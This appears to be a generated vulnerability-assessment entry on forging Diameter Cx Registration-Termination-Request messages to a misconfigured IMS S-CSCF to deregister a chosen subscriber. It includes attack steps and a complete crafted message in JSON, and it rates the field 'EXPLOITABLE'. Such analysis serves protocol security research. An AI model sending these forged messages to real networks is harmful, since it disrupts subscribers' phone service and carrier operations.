@@ -1,0 +1,101 @@
+### **Threat Model:**
+- **Attack Assumption:**
+  - The victim is an **S-CSCF** exposing its **Cx Diameter** service due to misconfiguration. An Internet attacker can impersonate the **HSS** role and establish an unauthenticated Diameter connection to that S-CSCF. The victim accepts forged **Registration-Termination-Request (RTR)** messages and processes them as authoritative HSS-originated registration-control commands.
+
+- **Attacker Capability:**
+  - The attacker can actively send crafted **RTR** requests on its own Diameter connection and receive the resulting **RTA** answers. The attacker does not observe or alter legitimate HSS-S-CSCF traffic and has no extra SIP/radio/EPC powers beyond supplying a valid target subscriber identity and syntactically correct Cx AVPs, including `Deregistration-Reason.Reason-Code`.
+
+### **Exploitability Analysis:**
+`Deregistration-Reason.Reason-Code` is a **nested enumerated control AVP** inside `Deregistration-Reason` in an **RTR request** from HSS to S-CSCF. In this context it is not passive metadata: the S-CSCF uses it as **authoritative input** to classify the deregistration being ordered.
+
+
+Changing `Reason-Code` can influence **how** the S-CSCF performs cleanup-e.g., treating the event as `PERMANENT_TERMINATION` versus `SERVER_CHANGE`/`NEW_SERVER_ASSIGNED`-but the evidence only supports differences in local deregistration semantics, expected reassignment behavior, or degree of purge. It does not show that this field alone drives a distinct downstream exploit such as persistent subscriber-data corruption, EPC bearer/control changes, wrong APN/QoS, authorization escalation, or a materially different network impact that would not already arise from the forged RTR.
+**Attack Procedure:**
+1. Establish a Diameter connection to the target S-CSCF while impersonating an HSS peer.
+2. Craft a minimal but coherent `Registration-Termination-Request (RTR)` with mandatory AVPs only, plus a `Public-Identity` to precisely target one IMS public identity.
+3. Set the target field `Deregistration-Reason.Reason-Code` to a malicious test value. A strong field-specific test is `PERMANENT_TERMINATION (0)` because it exercises the strongest de-registration semantic and the least self-healing recovery path.
+4. Keep identity targeting constant across tests; vary only `Reason-Code` if comparing field-specific behavior.
+5. Send the RTR and observe successful acceptance via the corresponding RTA plus subscriber-impacting behavior such as IMS deregistration, session disruption, or failed/changed re-registration path.
+
+Only mandatory and coherence-related AVPs are included below; unrelated AVPs are excluded.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 304,
+    "application_id": 16777216,
+    "flags": {
+      "request": true,
+      "proxiable": true,
+      "error": false,
+      "retransmitted": false
+    },
+    "hop_by_hop_id": "0x4a3b2c1d",
+    "end_to_end_id": "0x7e6f5a4b"
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "attacker-hss.example.net;1710000001;cx-rtr-001"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777216
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "hss.attacker.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "attacker.example.net"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "scscf1.ims.example.com"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "ims.example.com"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "imsi001010123456789@ims.example.com"
+    },
+    {
+      "avp_name": "Public-Identity",
+      "avp_value": "sip:alice@ims.example.com"
+    },
+    {
+      "avp_name": "Deregistration-Reason",
+      "grouped_avp": [
+        {
+          "avp_name": "Reason-Code",
+          "avp_value": 0
+        },
+        {
+          "avp_name": "Reason-Info",
+          "avp_value": "attack"
+        }
+      ]
+    }
+  ]
+}
+```
+
+**Classification:**
+- `EXPLOITABLE`
